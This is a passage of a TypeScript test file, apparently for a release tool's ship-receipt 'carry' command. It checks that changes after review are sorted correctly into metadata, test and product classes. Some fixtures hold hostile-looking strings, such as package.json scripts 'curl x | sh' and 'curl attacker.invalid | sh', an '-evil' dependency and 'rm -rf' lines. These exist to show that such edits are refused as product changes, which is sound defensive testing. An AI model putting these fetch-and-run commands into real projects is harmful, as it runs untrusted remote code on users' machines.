  // Generated by /ship Step 7 (coverage audit of the harness lane E diff).
  // Value: protects=a release-metadata-only change (VERSION, CHANGELOG, lockfile, the policy's stamp_paths and release_outputs)
  // carries with reason "release metadata" and every path classed metadata, so a stamp never sends a Captain back through a full
  // /ship; fails_when=the metadata globs or the policy-derived extras stop excluding those paths from the product patch-id, or
  // classifyCarryPath/planCarry mislabel them; why_new=the existing carry tests cover base merges and test-only fixes, never the
  // metadata class or the policy extras; seam=none; no_claim=none beyond protects
  test('a release-metadata-only change (stamp files, CHANGELOG, policy stamp_paths and release_outputs) carries as "release metadata"; the classifier and the plan name every class', () => {
    expect(classifyCarryPath('src/app.ts')).toBe('product');
    expect(classifyCarryPath('docs/notes.md')).toBe('product');
    expect(classifyCarryPath('docs/notes.md', { metadata: ['docs/**/*.md'] })).toBe('metadata');
    expect(classifyCarryPath('test/app.test.ts')).toBe('test');
    expect(classifyCarryPath('src/__tests__/app.ts')).toBe('test');
    expect(classifyCarryPath('pkg/thing_test.go')).toBe('test');
    expect(classifyCarryPath('CHANGELOG.md')).toBe('metadata');
    // a lockfile is a dependency manifest: product unless the policy names it; a .spec.yaml is an API contract, not a test
    expect(classifyCarryPath('bun.lock')).toBe('product');
    expect(classifyCarryPath('package-lock.json')).toBe('product');
    expect(classifyCarryPath('bun.lock', { metadata: ['bun.lock'] })).toBe('metadata');
    expect(classifyCarryPath('api/openapi.spec.yaml')).toBe('product');
    expect(classifyCarryPath('src/app.spec.ts')).toBe('test');
    expect(classifyCarryPath('agents-digest/gstack-AGENTS.md')).toBe('metadata');
    expect(classifyCarryPath('test/fixtures/VERSION')).toBe('test');
    // package.json and VERSION are metadata only while the change is a version stamp and nothing else
    const pkg = (v: string, extra = '') => `{\n  "name": "fx",\n  "version": "${v}",\n  "dependencies": { "left-pad": "1.0.0"${extra} }\n}\n`;
    expect(classifyCarryPath('package.json', {}, { before: pkg('1.2.3'), after: pkg('1.2.4') })).toBe('metadata');
    expect(classifyCarryPath('package.json', {}, { before: pkg('1.2.3'), after: pkg('1.2.4', ', "evil": "9.9.9"') })).toBe('product');
    expect(classifyCarryPath('package.json', {}, { before: pkg('1.2.3'), after: pkg('1.2.3').replace('"dependencies"', '"scripts": { "test": "curl x | sh" }, "dependencies"') })).toBe('product');
    expect(classifyCarryPath('VERSION', {}, { before: '1.2.3.0\n', after: '1.2.4.0\n' })).toBe('metadata');
    expect(classifyCarryPath('VERSION', {}, { before: '1.2.3.0\n', after: '1.2.4.0\nextra\n' })).toBe('product');
    expect(classifyCarryPath('package.json')).toBe('metadata');
    // a policy-named stamp path is metadata only while its change is a stamp, the rule the tree receipt applies to the same paths:
    // a logic change in a stamped source file is product (pass-4 outside review of #3481)
    const stamped = { oldVersion: '1.2.3.0', newVersion: '1.2.4.0' };
    expect(classifyCarryPath('src/version.ts', { metadata: ['src/version.ts'] }, { before: 'export const V = "1.2.3.0";\n', after: 'export const V = "1.2.4.0";\n', ...stamped })).toBe('metadata');
    expect(classifyCarryPath('src/version.ts', { metadata: ['src/version.ts'] }, { before: 'export const V = "1.2.3.0";\n', after: 'export const V = "1.2.4.0";\nexport const unsafe = true;\n', ...stamped })).toBe('product');
    expect(classifyCarryPath('src/version.ts', { metadata: ['src/version.ts'] }, { before: 'export const V = "1.2.3.0";\n', after: 'export const V = "1.2.3.0";\nexport const unsafe = true;\n', oldVersion: '1.2.3.0', newVersion: '1.2.3.0' })).toBe('product');
    expect(classifyCarryPath('plugin/manifest.json', { metadata: ['plugin/**'] }, { before: '{\n  "version": "1.2.3"\n}\n', after: '{\n  "version": "1.2.4"\n}\n', ...stamped })).toBe('metadata');
    expect(classifyCarryPath('plugin/manifest.json', { metadata: ['plugin/**'] }, { before: '{\n  "version": "1.2.3"\n}\n', after: '{\n  "version": "1.2.4",\n  "permissions": ["all"]\n}\n', ...stamped })).toBe('product');
    expect(stampOnlyText({ before: 'v1.2.3.0', after: 'v1.2.4.0', ...stamped })).toBe(true);
    expect(stampOnlyText({ before: null, after: 'v1.2.4.0', ...stamped })).toBe(false);
    expect(stampOnlyText({ before: 'v1.2.3.0', after: 'v1.2.4.0', oldVersion: null, newVersion: '1.2.4.0' })).toBe(false);
    const base = { from: 'f'.repeat(40), head: 'e'.repeat(40), productPatchId: { from: 'p', head: 'p' }, testPatchId: { from: 't', head: 't' }, changedProduct: [], mergeCommits: 0, rangeDiff: 'rd' };
    const meta = planCarry({ ...base, changed: [{ path: 'VERSION', class: 'metadata' }, { path: 'CHANGELOG.md', class: 'metadata' }] });
    expect(meta.ok && meta.carry.reason).toBe('release metadata');
    expect(meta.ok && meta.carry.changed_paths).toEqual(['metadata:VERSION', 'metadata:CHANGELOG.md']);
    const merges = planCarry({ ...base, mergeCommits: 2, changed: [{ path: 'src/other.ts', class: 'product' }] });
    expect(merges.ok && merges.carry.reason).toBe('2 base merges');
    const reverted = planCarry({ ...base, changed: [{ path: 'src/other.ts', class: 'product' }] });
    expect(reverted.ok && reverted.carry.reason).toBe('no product change');
    const empty = planCarry({ ...base, changed: [] });
    expect(empty.ok && [empty.carry.reason, empty.carry.product_patch_id]).toEqual(['no content change', 'p']);
    expect(planCarry({ ...base, productPatchId: { from: '', head: '' }, changed: [] }).ok && (planCarry({ ...base, productPatchId: { from: '', head: '' }, changed: [] }) as any).carry.product_patch_id).toBe('none');
    const changed = planCarry({ ...base, productPatchId: { from: 'p', head: 'q' }, mergeCommits: 1, changed: [], changedProduct: Array.from({ length: 22 }, (_, i) => `src/f${i}.ts`) });
    expect(changed.ok).toBe(false);
    expect(!changed.ok && changed.code).toBe('RECEIPT_CARRY_PRODUCT_CHANGED');
    expect(!changed.ok && changed.message).toContain('src/f0.ts, src/f1.ts');
    expect(!changed.ok && changed.message).toContain('src/f19.ts (+2 more)');
    expect(!changed.ok && changed.message).not.toContain('src/f20.ts');

    const repo = fixture();
    fs.mkdirSync(path.join(repo.work, 'src'), { recursive: true });
    fs.writeFileSync(path.join(repo.work, 'src', 'app.ts'), 'export const a = 1;\n');
    repo.git('add', '.'); repo.git('commit', '-qm', 'seed app'); repo.git('push', '-q', 'origin', 'main');
    repo.git('checkout', '-qb', 'feat');
    fs.writeFileSync(path.join(repo.work, 'src', 'app.ts'), 'export const a = 2;\n');
    repo.git('commit', '-qam', 'feat: a=2');
    const reviewed = repo.git('rev-parse', 'HEAD');
    // the stamp: VERSION, package.json (version only), the CHANGELOG, a stamp_paths doc and a release_outputs file
    fs.writeFileSync(path.join(repo.work, 'VERSION'), '1.2.4.0\n');
    fs.writeFileSync(path.join(repo.work, 'package.json'), fs.readFileSync(path.join(repo.work, 'package.json'), 'utf8').replace('"version": "1.2.3"', '"version": "1.2.4"'));
    fs.writeFileSync(path.join(repo.work, 'CHANGELOG.md'), fs.readFileSync(path.join(repo.work, 'CHANGELOG.md'), 'utf8').replace('# Changelog\n', '# Changelog\n\n## [1.2.4.0] - 2026-10-26\n\n- a=2\n'));
    fs.writeFileSync(path.join(repo.work, 'docs', 'notes.md'), fs.readFileSync(path.join(repo.work, 'docs', 'notes.md'), 'utf8').replace('v1.2.3.0', 'v1.2.4.0'));
    fs.writeFileSync(path.join(repo.work, 'generated', 'digest.md'), '# digest v1.2.4.0\nbody\n');
    repo.git('commit', '-qam', 'stamp 1.2.4.0');
    const head = repo.git('rev-parse', 'HEAD');
    const body = path.join(repo.root, 'body.md');
    fs.writeFileSync(body, placeReceiptFirst('## Summary\n\nProse.\n', { schema_version: 1, pr: 6, head: reviewed, base: 'main', version: '1.2.3.0' } as any));
    const env = { GSTACK_STATE_ROOT: path.join(repo.root, 'state'), GSTACK_SESSION_KIND: 'unattended' };
    const carried = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--out', path.join(repo.root, 'carry-run'), '--json'], env);
    expect(carried.status).toBe(EXIT.ok);
    expect(carried.out).toContain(`CARRY: carried from ${reviewed.slice(0, 12)} to ${head.slice(0, 12)} (release metadata)`);
    const after = extractReceipt(fs.readFileSync(body, 'utf8'));
    expect(after.errors).toEqual([]);
    expect(after.receipt).toMatchObject({ pr: 6, head, carry: { from: reviewed, reason: 'release metadata', merge_commits: 0 } });
    expect(after.receipt!.carry!.changed_paths.sort()).toEqual([
      'metadata:CHANGELOG.md', 'metadata:VERSION', 'metadata:docs/notes.md', 'metadata:generated/digest.md', 'metadata:package.json']);
    expect(after.receipt!.carry!.product_patch_id).toMatch(/^[0-9a-f]{40}$/);
    // a lockfile edit is a product change (the policy names no lockfile), named by path
    fs.writeFileSync(path.join(repo.work, 'package-lock.json'), fs.readFileSync(path.join(repo.work, 'package-lock.json'), 'utf8').replace(/"version": "1\.2\.3"(\s*\}\s*\}\s*\}\s*)$/, '"version": "9.9.9"$1'));
    repo.git('commit', '-qam', 'lockfile');
    const lock = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--dry-run'], env);
    expect(lock.status).toBe(EXIT.refused);
    expect(lock.err).toContain(': package-lock.json');
    repo.git('reset', '-q', '--hard', head);
    // a stamp_paths file whose change is not a stamp (a sentence added under the same version) is a product change, named by path
    fs.appendFileSync(path.join(repo.work, 'docs', 'notes.md'), 'Deploy hook now runs as root.\n');
    repo.git('commit', '-qam', 'notes');
    const stampPath = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--dry-run'], env);
    expect(stampPath.status).toBe(EXIT.refused);
    expect(stampPath.err).toContain('(RECEIPT_CARRY_PRODUCT_CHANGED;');
    expect(stampPath.err).toContain(': docs/notes.md');
    repo.git('reset', '-q', '--hard', head);
    // a dependency swap plus a new script in package.json is a product change, whatever the version did
    fs.writeFileSync(path.join(repo.work, 'package.json'), fs.readFileSync(path.join(repo.work, 'package.json'), 'utf8').replace('"left-pad": "1.2.3"', '"left-pad": "9.9.9-evil"').replace('"scripts": {', '"scripts": { "test": "curl attacker.invalid | sh",'));
    repo.git('commit', '-qam', 'deps');
    const deps = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--dry-run'], env);
    expect(deps.status).toBe(EXIT.refused);
    expect(deps.err).toContain('(RECEIPT_CARRY_PRODUCT_CHANGED;');
    expect(deps.err).toContain(': package.json');
    repo.git('reset', '-q', '--hard', head);
    // the same stamp plus a product edit is still a product change, named by path
    fs.writeFileSync(path.join(repo.work, 'src', 'app.ts'), 'export const a = 3;\n');
    fs.writeFileSync(path.join(repo.work, 'VERSION'), '1.2.5.0\n');
    repo.git('commit', '-qam', 'a=3 and restamp');
    const refusedRun = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body], env);
    expect(refusedRun.status).toBe(EXIT.refused);
    expect(refusedRun.err).toContain(': src/app.ts');
    expect(refusedRun.err).not.toContain('VERSION');
    expect(extractReceipt(fs.readFileSync(body, 'utf8')).receipt!.head).toBe(head);
  });

  // GST-343 (found on #3648): after #3654 a base merge moves a PR's entry from CHANGELOG.md's [Unreleased] into changelog.d/.
  // Value: protects=a PR that moves its entry into a changelog_fragments fragment keeps its receipt, as a CHANGELOG edit does;
  // fails_when=carry counts <dir>/<slug>.md as product (RECEIPT_CARRY_PRODUCT_CHANGED), or counts the fragment directory's
  // README, a nested path or a fragment under a policy without changelog_fragments as metadata; why_new=carry had no
  // fragments rule; seam=none; no_claim=gh pr edit (--body stands in)
  test('a merge-only head that moves the entry into a changelog_fragments fragment carries; the README, a nested path and a fragment with no fragments policy are product', () => {
    const frag = { metadata: [], fragments: 'changelog.d' };
    expect(classifyCarryPath('changelog.d/feat.md', frag)).toBe('metadata');
    expect(classifyCarryPath('changelog.d/README.md', frag)).toBe('product');
    expect(classifyCarryPath('changelog.d/sub/feat.md', frag)).toBe('product');
    expect(classifyCarryPath('changelog.d/feat.sh', frag)).toBe('product');
    expect(classifyCarryPath('changelog.d/feat.md')).toBe('product');
    const policy = (fragments: boolean) => JSON.stringify({ bump: 'patch', changelog: 'CHANGELOG.md', ...(fragments ? { changelog_fragments: { dir: 'changelog.d' }, min_gstack_version: '1.91.336.0' } : {}) }) + '\n';
    const run = (fragments: boolean, extra: Record<string, string> = {}) => {
      const repo = makeFixtureRepo({ policy: null, prefix: 'ship-receipt-frag-' }); repos.push(repo);
      const put = (rel: string, text: string) => { fs.mkdirSync(path.dirname(path.join(repo.work, rel)), { recursive: true }); fs.writeFileSync(path.join(repo.work, rel), text); };
      const released = fs.readFileSync(path.join(repo.work, 'CHANGELOG.md'), 'utf8');
      put('src/app.ts', 'export const a = 1;\n');
      put('changelog.d/README.md', '# fragments\n');
      repo.git('add', '-A'); repo.git('commit', '-qm', 'seed app'); repo.git('push', '-q', 'origin', 'main');
      repo.git('checkout', '-qb', 'feat');
      put('src/app.ts', 'export const a = 2;\n');
      put('CHANGELOG.md', released.replace('# Changelog\n', '# Changelog\n\n## [Unreleased]\n\n- a=2\n'));
      repo.git('add', '-A'); repo.git('commit', '-qm', 'feat: a=2');
      const reviewed = repo.git('rev-parse', 'HEAD');
      // main turns on fragments (or only adds a policy without them); the merge moves the entry into changelog.d/feat.md
      repo.git('checkout', '-q', 'main');
      put('.gstack/ship-policy.json', policy(fragments));
      repo.git('add', '-A'); repo.git('commit', '-qm', 'policy'); repo.git('push', '-q', 'origin', 'main');
      repo.git('checkout', '-q', 'feat');
      repo.git('merge', '-q', '--no-commit', 'origin/main');
      put('CHANGELOG.md', released);
      put('changelog.d/feat.md', '- a=2\n');
      for (const [rel, text] of Object.entries(extra)) put(rel, text);
      repo.git('add', '-A'); repo.git('commit', '-qm', 'merge main; entry into a fragment');
      const body = path.join(repo.root, 'body.md');
      fs.writeFileSync(body, placeReceiptFirst('## Summary\n\nProse.\n', { schema_version: 1, pr: 6, head: reviewed, base: 'main', version: '1.2.3.0' } as any));
      const env = { GSTACK_STATE_ROOT: path.join(repo.root, 'state'), GSTACK_SESSION_KIND: 'unattended' };
      return { reviewed, head: repo.git('rev-parse', 'HEAD'), out: runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--dry-run'], env) };
    };
    const moved = run(true);
    expect(moved.out.status).toBe(EXIT.ok);
    expect(moved.out.out).toContain(`CARRY: would carry from ${moved.reviewed.slice(0, 12)} to ${moved.head.slice(0, 12)} (base merge + release metadata)`);
    const readme = run(true, { 'changelog.d/README.md': '# fragments\nRun rm -rf on merge.\n' });
    expect(readme.out.status).toBe(EXIT.refused);
    expect(readme.out.err).toContain('(RECEIPT_CARRY_PRODUCT_CHANGED;');
    expect(readme.out.err).toContain('changelog.d/README.md');
    const off = run(false);
    expect(off.out.status).toBe(EXIT.refused);
    expect(off.out.err).toContain('(RECEIPT_CARRY_PRODUCT_CHANGED;');
    expect(off.out.err).toContain('changelog.d/feat.md');
  }, 30_000);

  // /ship Step 9 pass 1 (security specialist, reproduced in the QA smoke): the carry's proof was patch-id --stable, which strips whitespace.
  // Value: protects=a product edit that only moves whitespace in a reviewed line (semantics in shell, YAML, Python) refuses to carry,
  // and a dirty working tree refuses before anything is compared; fails_when=patchId drops --verbatim or the status check goes;
  // why_new=the carry tests covered content edits only; seam=none; no_claim=none beyond protects
  test('carry refuses a whitespace-only edit to a reviewed line and a working tree with uncommitted changes', () => {
    const repo = fixture();
    fs.mkdirSync(path.join(repo.work, 'bin'), { recursive: true });
    fs.writeFileSync(path.join(repo.work, 'bin', 'x.sh'), '#!/bin/sh\necho start\n');
    repo.git('add', '.'); repo.git('commit', '-qm', 'seed'); repo.git('push', '-q', 'origin', 'main');
    repo.git('checkout', '-qb', 'feat');
    fs.writeFileSync(path.join(repo.work, 'bin', 'x.sh'), '#!/bin/sh\necho start\nrm -rf "$DIR"/x\n');
    repo.git('commit', '-qam', 'reviewed');
    const reviewed = repo.git('rev-parse', 'HEAD');
    const body = path.join(repo.root, 'body.md');
    fs.writeFileSync(body, placeReceiptFirst('## Summary\n\nProse.\n', { schema_version: 1, pr: 6, head: reviewed, base: 'main' } as any));
    const env = { GSTACK_STATE_ROOT: path.join(repo.root, 'state'), GSTACK_SESSION_KIND: 'unattended' };
    // a carry-able commit (a test) with a pending product edit beside it: the pending edit is not in what the carry compares
    fs.mkdirSync(path.join(repo.work, 'test'), { recursive: true });
    fs.writeFileSync(path.join(repo.work, 'test', 'x.test.ts'), 'test\n');
    repo.git('add', 'test'); repo.git('commit', '-qm', 'test');
    fs.writeFileSync(path.join(repo.work, 'bin', 'x.sh'), '#!/bin/sh\necho start\nrm -rf "$DIR" /x\n');
    const dirty = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--dry-run'], env);
    expect(dirty.status).toBe(EXIT.refused);
    expect(dirty.err).toContain('the working tree has uncommitted changes (bin/x.sh)');
    expect(dirty.err).toContain('(RECEIPT_CARRY_REFUSED;');
    repo.git('commit', '-qam', 'ws only');
    const ws = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--dry-run'], env);
    expect(ws.status).toBe(EXIT.refused);
    expect(ws.err).toContain('(RECEIPT_CARRY_PRODUCT_CHANGED;');
    expect(ws.err).toContain(': bin/x.sh');
    expect(extractReceipt(fs.readFileSync(body, 'utf8')).receipt!.head).toBe(reviewed);
  });

  // /ship Step 9 pass 1 (testing specialist): a receipt carried twice named the carried head as its origin.
  // Value: protects=a receipt carried A→B then B→C still names the reviewed head A, adds up the hops' merges and paths, and the
  // run record's carried_from is A; fails_when=carryReceipt spreads the new carry over the old one; why_new=only single carries
  // were tested; seam=none; no_claim=none beyond protects
  test('a receipt carried twice keeps the reviewed head as carry.from and accumulates the hops', () => {
    const repo = fixture();
    fs.mkdirSync(path.join(repo.work, 'src'), { recursive: true });
    fs.writeFileSync(path.join(repo.work, 'src', 'app.ts'), 'export const a = 1;\n');
    fs.writeFileSync(path.join(repo.work, 'src', 'other.ts'), 'export const o = 1;\n');
    repo.git('add', '.'); repo.git('commit', '-qm', 'seed'); repo.git('push', '-q', 'origin', 'main');
    repo.git('checkout', '-qb', 'feat');
    fs.writeFileSync(path.join(repo.work, 'src', 'app.ts'), 'export const a = 2;\n');
    repo.git('commit', '-qam', 'feat');
    const a = repo.git('rev-parse', 'HEAD');
    // main moves on an unrelated file; feat merges it (hop 1), then a test lands (hop 2)
    repo.git('checkout', '-q', 'main');
    fs.writeFileSync(path.join(repo.work, 'src', 'other.ts'), 'export const o = 2;\n');
    repo.git('commit', '-qam', 'main: other'); repo.git('push', '-q', 'origin', 'main');
    repo.git('checkout', '-q', 'feat'); repo.git('merge', '-q', '--no-edit', 'main');
    const b = repo.git('rev-parse', 'HEAD');
    const body = path.join(repo.root, 'body.md');
    fs.writeFileSync(body, placeReceiptFirst('## Summary\n\nProse.\n', { schema_version: 1, pr: 6, head: a, base: 'main' } as any));
    const env = { GSTACK_STATE_ROOT: path.join(repo.root, 'state'), GSTACK_SESSION_KIND: 'unattended' };
    expect(runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body], env).status).toBe(EXIT.ok);
    fs.mkdirSync(path.join(repo.work, 'test'), { recursive: true });
    fs.writeFileSync(path.join(repo.work, 'test', 'app.test.ts'), 'test\n');
    repo.git('add', '.'); repo.git('commit', '-qm', 'test');
    const c = repo.git('rev-parse', 'HEAD');
    const second = runBin(repo, 'gstack-ship-receipt', ['carry', '--body', body, '--out', path.join(repo.root, 'run2'), '--json'], env);
    expect(second.status).toBe(EXIT.ok);
    expect(second.out).toContain(`CARRY: carried from ${b.slice(0, 12)} to ${c.slice(0, 12)} (test-only change)`);
    const receipt = extractReceipt(fs.readFileSync(body, 'utf8')).receipt!;
    expect(receipt.head).toBe(c);
    expect(receipt.carry).toMatchObject({ from: a, reason: 'base merge + test-only change', merge_commits: 1 });
    expect(receipt.carry!.changed_paths).toEqual(['product:src/other.ts', 'test:test/app.test.ts']);
    expect(receiptSummaryLine(receipt)).toContain(`carried_from=${a.slice(0, 12)}`);
    const run = JSON.parse(fs.readFileSync(path.join(repo.root, 'run2', 'ship-run.json'), 'utf8'));
    expect(run.carried_from).toBe(a);
  });

  // Generated by /ship Step 7 (coverage audit of the harness lane E diff).
  // Value: protects=carry through gh never rebinds a receipt to a head GitHub has not seen (HEAD ahead of the pushed head is
  // refused with "push first"), and a failed gh pr edit or gh pr view reports status=incomplete with the body left as it was,
  // never status=complete; fails_when=the headRefOid check is dropped, or the gh failure path returns the terminal complete line
  // or writes a run record; why_new=the existing gh carry test covers the happy post only; seam=none; no_claim=gh itself (a shim
  // stands in for pr view and pr edit)
  test('carry --pr refuses a HEAD that is not the pushed head, and a failing gh pr edit or pr view is incomplete with nothing carried', () => {
    const repo = fixture();
    fs.writeFileSync(path.join(repo.work, 'a.txt'), 'a\n');
    repo.git('add', '.'); repo.git('commit', '-qm', 'seed'); repo.git('push', '-q', 'origin', 'main');
    repo.git('checkout', '-qb', 'feat');
    fs.writeFileSync(path.join(repo.work, 'a.txt'), 'b\n');
    repo.git('commit', '-qam', 'feat');
    const reviewed = repo.git('rev-parse', 'HEAD');
    repo.git('commit', '-q', '--allow-empty', '-m', 'empty follow-up');
    const head = repo.git('rev-parse', 'HEAD');
    const shimDir = path.join(repo.root, 'gh3');
    fs.mkdirSync(shimDir);
    const posted = path.join(shimDir, 'posted.md');
    const prJson = path.join(shimDir, 'pr.json');
    const editRc = path.join(shimDir, 'edit-rc');
    const prBody = placeReceiptFirst('## Summary\n\nProse.\n', { schema_version: 1, pr: 8, head: reviewed, base: 'main' } as any);
    fs.writeFileSync(path.join(shimDir, 'gh'), [
      '#!/bin/sh',
      `if [ "$1" = pr ] && [ "$2" = view ]; then [ -f "${prJson}" ] || { echo "gh: HTTP 502" >&2; exit 1; }; cat "${prJson}"; exit 0; fi`,
      `if [ "$1" = pr ] && [ "$2" = edit ]; then shift 3; [ "$1" = --body-file ] || exit 9; cp "$2" "${posted}"; rc=$(cat "${editRc}" 2>/dev/null || echo 0); [ "$rc" = 0 ] || echo "gh: validation failed" >&2; exit "$rc"; fi`,
      'echo "unsupported $*" >&2; exit 1', '',
    ].join('\n'), { mode: 0o755 });
    const env = { GSTACK_STATE_ROOT: path.join(repo.root, 'state'), PATH: `${shimDir}:${process.env.PATH}` };
    const runDir = path.join(repo.root, 'run');
    // GitHub still has the reviewed head: the follow-up was never pushed
    fs.writeFileSync(prJson, JSON.stringify({ body: prBody, headRefOid: reviewed }));
    const unpushed = runBin(repo, 'gstack-ship-receipt', ['carry', '--pr', '8', '--out', runDir], env);
    expect(unpushed.status).toBe(EXIT.refused);
    expect(unpushed.err).toContain(`HEAD ${head.slice(0, 12)} is not PR #8's pushed head ${reviewed.slice(0, 12)}; push first, then carry`);
    expect(unpushed.err).toContain('(RECEIPT_CARRY_REFUSED;');
    expect(unpushed.out.trim()).toBe('CARRY: refused (RECEIPT_CARRY_REFUSED)\nGSTACK_RESULT: skill=ship status=refused run=-');
    expect(fs.existsSync(posted)).toBe(false);
    // pushed, but the edit fails: incomplete, no run record, nothing carried
    fs.writeFileSync(prJson, JSON.stringify({ body: prBody, headRefOid: head }));
    fs.writeFileSync(editRc, '1\n');
    const editFailed = runBin(repo, 'gstack-ship-receipt', ['carry', '--pr', '8', '--out', runDir], env);
    expect(editFailed.status).toBe(EXIT.fail);
    expect(editFailed.err).toContain('gh pr edit failed: gh: validation failed; the receipt was not carried');
    expect(editFailed.out.trim()).toBe('GSTACK_RESULT: skill=ship status=incomplete run=-');
    expect(fs.existsSync(runDir)).toBe(false);
    const jsonFail = runBin(repo, 'gstack-ship-receipt', ['carry', '--pr', '8', '--out', runDir, '--json'], env);
    expect(jsonFail.status).toBe(EXIT.fail);
    expect(JSON.parse(jsonFail.out)).toMatchObject({ skill: 'ship', status: 'incomplete', run: '-' });
    // gh pr view fails: incomplete, not refused
    fs.rmSync(prJson);
    const viewFailed = runBin(repo, 'gstack-ship-receipt', ['carry', '--pr', '8', '--out', runDir], env);
    expect(viewFailed.status).toBe(EXIT.fail);
    expect(viewFailed.err).toContain('gh pr view failed: gh: HTTP 502');
    expect(viewFailed.out.trim()).toBe('GSTACK_RESULT: skill=ship status=incomplete run=-');
    expect(fs.existsSync(runDir)).toBe(false);
  });
});

describe('review_loop receipt input (harness lane E: the factory scorecard counters)', () => {
  // Generated by /ship Step 7 (coverage audit of the harness lane E diff).
  // Value: protects=the receipt's review_loop carries only well-formed non-negative integer counters, and `write --review-loop`
  // refuses a malformed record instead of silently dropping it from the receipt the scorecard reads; fails_when=parseReviewLoop
  // accepts a float, a negative or a string count, or write ignores a bad --review-loop and writes the body anyway; why_new=the
  // write test covers one valid record only; seam=none; no_claim=none beyond protects
  // Moved out of the heavy write test above by /ship Step 7: with the loop case appended there, that test ran 4.8–5.0 s on a
  // 4-core machine and tripped bun's 5 s per-test default about every other run; the loop case needs no stamped tree receipt.
  test('write --review-loop records the loop counters in the receipt and the SHIP_RECEIPT line', () => {
    const repo = fixture();
    const loopFile = path.join(repo.root, 'review-loop.json');
    fs.writeFileSync(loopFile, JSON.stringify({ passes: 2, blocking_found: 1, deferred: 1, noted: 3, fixed: 1, scope: 'frozen' }));
    const loopBody = path.join(repo.root, 'body-loop.md');
    fs.writeFileSync(loopBody, '## Summary\n');
    const withLoop = runBin(repo, 'gstack-ship-receipt', ['write', '--pr', '42', '--base', 'main', '--gate', '{"tests":{"pass":1,"fail":0,"skip":0}}',
      '--session-kind', 'unattended', '--queue-mode', 'stamp-at-merge', '--history', 'squash-ok', '--review-loop', '@' + loopFile, '--body', loopBody]);
    expect(withLoop.status).toBe(EXIT.ok);
    expect(withLoop.err.trim()).toContain(' passes=2 blocking_found=1 deferred=1');
    expect(extractReceipt(withLoop.out).receipt).toMatchObject({ pr: 42, review_loop: { passes: 2, blocking_found: 1, deferred: 1, noted: 3, fixed: 1, scope: 'frozen' } });
    const written = extractReceipt(fs.readFileSync(loopBody, 'utf8'));
    expect(written.errors).toEqual([]);
    expect(Object.keys(written.receipt!).slice(-1)).toEqual(['review_loop']);
  });

  test('parseReviewLoop keeps integer counters and drops the rest; write --review-loop refuses a malformed record and writes nothing', () => {
    expect(parseReviewLoop({ passes: 2, blocking_found: 1, deferred: 1 })).toEqual({ passes: 2, blocking_found: 1, deferred: 1 });
    expect(parseReviewLoop({ passes: 2, blocking_found: 1, deferred: 1, noted: 3, fixed: 1, scope: 'frozen', extra: 'x' })).toEqual({ passes: 2, blocking_found: 1, deferred: 1, noted: 3, fixed: 1, scope: 'frozen' });
    expect(parseReviewLoop({ passes: 2, blocking_found: 1, deferred: 1, noted: -1, fixed: 1.5, scope: 'x'.repeat(40) })).toEqual({ passes: 2, blocking_found: 1, deferred: 1, scope: 'x'.repeat(20) });
    expect(parseReviewLoop({ passes: 0, blocking_found: 0, deferred: 0 })).toEqual({ passes: 0, blocking_found: 0, deferred: 0 });
    for (const bad of [undefined, null, 'frozen', [], { passes: 2, blocking_found: 1 }, { passes: '2', blocking_found: 1, deferred: 1 }, { passes: 1.5, blocking_found: 1, deferred: 1 }, { passes: -1, blocking_found: 1, deferred: 1 }]) {
      expect(parseReviewLoop(bad)).toBeUndefined();
    }
    expect(receiptSummaryLine({ schema_version: 1, head: HEAD, base: 'main', review_loop: { passes: '2', blocking_found: 1, deferred: 1 } } as any)).not.toContain('passes=');
    const repo = fixture();
    const body = path.join(repo.root, 'body.md');
    fs.writeFileSync(body, 'prose\n');
    const r = runBin(repo, 'gstack-ship-receipt', ['write', '--pr', '7', '--base', 'main', '--session-kind', 'x', '--review-loop', '{"passes":"2","blocking_found":1,"deferred":1}', '--body', body]);
    expect(r.status).toBe(EXIT.usage);
    expect(r.err).toContain('--review-loop needs integer passes, blocking_found and deferred');
    expect(r.out).toBe('');
    expect(fs.readFileSync(body, 'utf8')).toBe('prose\n');
  });
});

describe('bindReceipt head matching (rule 22)', () => {
  // Value: protects=a receipt binds only to a full or 12+ character prefix of an accepted head, and names the PR it was written for;
  // fails_when=the 12-character floor is dropped (head "a" would bind any head) or the pr check is removed;
  // why_new=the queue, train and result tests bind full 40-character heads only; seam=none; no_claim=gh and CLI wiring (pure function)
  test('binds a full head or a 12+ character prefix, refuses shorter prefixes, other heads and another PR\'s receipt', () => {
    const head = 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0';
    const other = 'f'.repeat(40);
    const body = (h: string, pr?: number) => placeReceiptFirst('Prose.\n', { schema_version: 1, head: h, base: 'main', ...(pr === undefined ? {} : { pr }) } as any);
    const rows: Array<[string, string, string[], string]> = [
      ['full head', head, [head], 'ok'],
      ['12-char prefix', head.slice(0, 12), [head], 'ok'],
      ['11-char prefix', head.slice(0, 11), [head], 'QUEUE_RECEIPT_STALE'],
      ['7-char prefix', head.slice(0, 7), [head], 'QUEUE_RECEIPT_STALE'],
      ['other head', other, [head], 'QUEUE_RECEIPT_STALE'],
      ['pin or current head', head, [other, head], 'ok'],
    ];
    for (const [name, h, accepted, want] of rows) {
      const b = bindReceipt(body(h), '3438', accepted);
      expect([name, b.ok ? 'ok' : b.code]).toEqual([name, want]);
      if (b.ok) expect(b.head).toBe(head);
    }
    const prefixBinding = bindReceipt(body(head.slice(0, 12)), '3438', [head]);
    expect(prefixBinding.ok && prefixBinding.line).toBe(`SHIP_RECEIPT: pr=- head=${head.slice(0, 12)} version=- base=main`);
    const otherPr = bindReceipt(body(head, 99), '3438', [head]);
    expect(otherPr.ok ? 'ok' : [otherPr.code, otherPr.message]).toEqual(['QUEUE_RECEIPT_STALE', "PR #3438's ship receipt names pr=99, not this PR"]);
    expect(bindReceipt(body(head, 3438), '3438', [head]).ok).toBe(true);
    expect(bindReceipt('No receipt.\n', '3438', [head])).toMatchObject({ ok: false, code: 'QUEUE_RECEIPT_MISSING', line: 'SHIP_RECEIPT: none in the PR body' });
    const short = bindReceipt(body(head.slice(0, 11)), '3438', [head]);
